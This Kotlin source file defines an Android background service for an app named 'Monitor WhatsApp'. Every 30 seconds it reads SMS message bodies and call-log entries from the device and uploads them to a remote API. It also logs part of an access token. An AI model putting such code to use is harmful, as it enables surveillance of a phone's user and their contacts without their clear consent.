package com.monitorwhatsapp.services

import android.app.*
import android.content.ContentResolver
import android.content.Context
import android.content.Intent
import android.database.Cursor
import android.net.Uri
import android.os.Build
import android.os.IBinder
import android.provider.CallLog
import android.provider.Telephony
import android.util.Log
import androidx.core.app.NotificationCompat
import com.monitorwhatsapp.MainActivity
import com.monitorwhatsapp.R
import com.monitorwhatsapp.api.ApiClient
import com.monitorwhatsapp.api.ApiService
import com.monitorwhatsapp.models.CallData
import com.monitorwhatsapp.models.MessageData
import com.monitorwhatsapp.models.SyncCallsRequest
import com.monitorwhatsapp.models.SyncMessagesRequest
import androidx.core.content.ContextCompat
import android.content.pm.PackageManager
import com.monitorwhatsapp.utils.TokenManager
import kotlinx.coroutines.*
import java.text.SimpleDateFormat
import java.util.*

class MonitoringService : Service() {

    private val TAG = "MonitoringService"
    private val CHANNEL_ID = "monitor_channel"
    private val NOTIFICATION_ID = 1001

    private lateinit var tokenManager: TokenManager
    private lateinit var apiService: ApiService
    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var isRunning = false

    override fun onCreate() {
        super.onCreate()
        tokenManager = TokenManager(this)
        apiService = ApiClient.create(tokenManager)
        createNotificationChannel()
        startForeground(NOTIFICATION_ID, createNotification())

        Log.d(TAG, "🚀 MonitoringService iniciado!")
        Log.d(TAG, "Device ID: ${tokenManager.getDeviceId()}")
        Log.d(TAG, "Token: ${tokenManager.getAccessToken()?.substring(0, 20)}...")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (!isRunning && tokenManager.isLoggedIn()) {
            isRunning = true
            startMonitoring()

            serviceScope.launch {
                delay(2000)
                collectAndSendData()
            }
        }
        return START_STICKY
    }

    private fun startMonitoring() {
        serviceScope.launch {
            while (isRunning) {
                try {
                    collectAndSendData()
                    delay(30 * 1000) // 30 segundos
                } catch (e: Exception) {
                    Log.e(TAG, "Erro na coleta: ${e.message}")
                }
            }
        }
    }

    private suspend fun collectAndSendData() {
        val deviceId = tokenManager.getDeviceId() ?: run {
            Log.e(TAG, "Device ID não encontrado!")
            return
        }

        val separator = "=================================================="

        Log.d(TAG, separator)
        Log.d(TAG, "Iniciando coleta de dados para device: $deviceId")

        // Coletar e enviar ligações (comentado até endpoint ser criado)
        val calls = collectCalls()
        Log.d(TAG, "Ligações coletadas: ${calls.size}")
        if (calls.isNotEmpty()) {
             sendCalls(deviceId, calls)
        } else {
             Log.d(TAG, "Nenhuma ligação encontrada")
         }

        // Coletar e enviar mensagens
        val messages = collectMessages()
        Log.d(TAG, "Mensagens coletadas: ${messages.size}")
        if (messages.isNotEmpty()) {
            sendMessages(deviceId, messages)
        } else {
            Log.d(TAG, "Nenhuma mensagem encontrada")
        }

        Log.d(TAG, "Coleta finalizada")
        Log.d(TAG, separator)
    }

    private fun collectMessages(): List<MessageData> {
        val messages = mutableListOf<MessageData>()
        val resolver: ContentResolver = contentResolver
        val uri: Uri = Telephony.Sms.CONTENT_URI

        try {
            val cursor: Cursor? = resolver.query(
                uri,
                null,
                null,
                null,
                "${Telephony.Sms.DATE} DESC"
            )

            cursor?.use {
                val dateFormat = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'", Locale.US)
                dateFormat.timeZone = TimeZone.getTimeZone("UTC")

                val addressIndex = it.getColumnIndex(Telephony.Sms.ADDRESS)
                val bodyIndex = it.getColumnIndex(Telephony.Sms.BODY)
                val dateIndex = it.getColumnIndex(Telephony.Sms.DATE)
                val typeIndex = it.getColumnIndex(Telephony.Sms.TYPE)
                val readIndex = it.getColumnIndex(Telephony.Sms.READ)

                var count = 0
                while (it.moveToNext() && count < 100) {
                    val number = it.getString(addressIndex)
                    val content = it.getString(bodyIndex)
                    val date = dateFormat.format(Date(it.getLong(dateIndex)))
                    val type = if (it.getInt(typeIndex) == Telephony.Sms.MESSAGE_TYPE_SENT) "sent" else "received"
                    val isRead = it.getInt(readIndex) == 1

                    messages.add(
                        MessageData(
                            phone_number = number,
                            contact_name = null,
                            direction = type,
                            content = content,
                            message_date = date,
                            is_read = isRead
                        )
                    )
                    count++
                }
                Log.d(TAG, "Mensagens lidas do dispositivo: $count")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Erro ao coletar mensagens: ${e.message}")
        }

        return messages
    }

    private suspend fun sendMessages(deviceId: String, messages: List<MessageData>) {
        try {
            val request = SyncMessagesRequest(device_id = deviceId, messages = messages)
            val response = apiService.syncMessages(request)  // ← Nome correto do método

            if (response.isSuccessful) {
                Log.d(TAG, "✅ Mensagens enviadas: ${messages.size}")

                // Log da resposta para debug
                val responseBody = response.body()
                Log.d(TAG, "Resposta do servidor: $responseBody")

            } else {
                val errorBody = response.errorBody()?.string()
                Log.e(TAG, "❌ Erro ao enviar mensagens: Código ${response.code()}")
                Log.e(TAG, "❌ Detalhes: $errorBody")
            }
        } catch (e: Exception) {
            Log.e(TAG, "❌ Exceção ao enviar mensagens: ${e.message}")
        }
    }

    private fun collectCalls(): List<CallData> {
        val calls = mutableListOf<CallData>()
        Log.d(TAG, "📞 Executando collectCalls()...")

        try {
            // Verificar permissão primeiro
            val hasPermission = ContextCompat.checkSelfPermission(
                this,
                android.Manifest.permission.READ_CALL_LOG
            ) == PackageManager.PERMISSION_GRANTED

            Log.d(TAG, "📞 Permissão READ_CALL_LOG: $hasPermission")

            if (!hasPermission) {
                Log.e(TAG, "📞❌ Sem permissão para ler ligações!")
                return calls
            }

            // Se tiver permissão, continua com a coleta
            val cursor = contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                null,
                null,
                null,
                "${CallLog.Calls.DATE} DESC"
            )

            if (cursor == null) {
                Log.e(TAG, "📞❌ Cursor retornou null")
                return calls
            }

            Log.d(TAG, "📞 Total de ligações no dispositivo: ${cursor.count}")

            cursor.use {
                val numberIndex = it.getColumnIndex(CallLog.Calls.NUMBER)
                val typeIndex = it.getColumnIndex(CallLog.Calls.TYPE)
                val dateIndex = it.getColumnIndex(CallLog.Calls.DATE)
                val durationIndex = it.getColumnIndex(CallLog.Calls.DURATION)
                val nameIndex = it.getColumnIndex(CallLog.Calls.CACHED_NAME)

                Log.d(TAG, "📞 Índices - number:$numberIndex, type:$typeIndex, date:$dateIndex, duration:$durationIndex")

                var count = 0
                while (it.moveToNext() && count < 100) {
                    try {
                        val number = if (numberIndex >= 0) it.getString(numberIndex) else "unknown"
                        val type = if (typeIndex >= 0) {
                            when (it.getInt(typeIndex)) {
                                CallLog.Calls.INCOMING_TYPE -> "incoming"
                                CallLog.Calls.OUTGOING_TYPE -> "outgoing"
                                CallLog.Calls.MISSED_TYPE -> "missed"
                                else -> "unknown"
                            }
                        } else "unknown"

                        val date = if (dateIndex >= 0) it.getLong(dateIndex) else 0L
                        val duration = if (durationIndex >= 0) it.getLong(durationIndex) else 0L
                        val name = if (nameIndex >= 0) it.getString(nameIndex) else null

                        val dateFormat = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'", Locale.US)
                        dateFormat.timeZone = TimeZone.getTimeZone("UTC")
                        val dateStr = dateFormat.format(Date(date))

                        calls.add(
                            CallData(
                                phone_number = number,
                                contact_name = name,
                                call_type = type,
                                duration = duration,
                                call_date = dateStr
                            )
                        )
                        count++
                    } catch (e: Exception) {
                        Log.e(TAG, "📞❌ Erro ao processar linha: ${e.message}")
                    }
                }
                Log.d(TAG, "📞 Ligações processadas: $count")
            }
        } catch (e: SecurityException) {
            Log.e(TAG, "📞❌ Erro de segurança: ${e.message}")
        } catch (e: Exception) {
            Log.e(TAG, "📞❌ Erro geral: ${e.message}")
        }

        return calls
    }

    private suspend fun sendCalls(deviceId: String, calls: List<CallData>) {
        Log.d(TAG, "📤 Enviando ${calls.size} ligações para API...")

        try {
            val request = SyncCallsRequest(device_id = deviceId, calls = calls)
            Log.d(TAG, "📤 Request: deviceId=$deviceId, calls=${calls.size}")

            val response = apiService.syncCalls(request)

            Log.d(TAG, "📤 Resposta código: ${response.code()}")

            if (response.isSuccessful) {
                Log.d(TAG, "✅ Ligações enviadas com sucesso!")
            } else {
                val errorBody = response.errorBody()?.string()
                Log.e(TAG, "❌ Erro ${response.code()}: $errorBody")
            }
        } catch (e: Exception) {
            Log.e(TAG, "❌ Exceção: ${e.message}")
            e.printStackTrace()
        }
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Monitor WhatsApp",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Canal para serviço de monitoramento"
            }

            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }
    }

    private fun createNotification(): Notification {
        val intent = Intent(this, MainActivity::class.java)
        val pendingIntent = PendingIntent.getActivity(
            this, 0, intent,
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )

        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Monitor WhatsApp")
            .setContentText("Coletando dados em background")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setContentIntent(pendingIntent)
            .setOngoing(true)
            .build()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        isRunning = false
        serviceScope.cancel()
    }
}